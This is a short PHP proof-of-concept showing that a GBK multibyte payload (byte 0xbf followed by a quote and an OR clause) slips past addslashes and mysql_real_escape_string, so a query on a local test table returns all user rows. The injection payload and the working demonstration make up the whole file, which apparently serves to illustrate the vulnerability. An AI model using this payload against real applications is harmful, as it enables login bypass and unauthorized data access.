<?php

    header('Content-Type: text/html; charset=GBK');
    $input = chr(0xbf) . chr(0x27) . ' OR username = username; /*';
    $value = addslashes($input);
    $sql = "SELECT * FROM users WHERE username='{$value}' AND password='123123';";

    echo $value;
    echo '<br>';
    echo $sql;
    echo '<br>';


    $c = mysql_connect("localhost", "root", "");

    mysql_select_db("test", $c);

    mysql_query("CREATE TABLE users (

        username VARCHAR(32) PRIMARY KEY,

        password VARCHAR(32)

    ) CHARACTER SET 'GBK'", $c);

    mysql_query("INSERT INTO users VALUES('foo','bar'), ('baz','test')", $c);

    // change our character set

    mysql_set_charset('gbk',$c);
    $value = mysql_real_escape_string($input, $c);
    $sql = "SELECT * FROM users WHERE username='{$value}' AND password='123123';";

    echo $value;
    echo '<br>';
    echo $sql;
    echo '<br>';

    $res = mysql_query($sql, $c);

    echo mysql_num_rows($res); // will print 2, indicating that we were able to fetch all records


?>
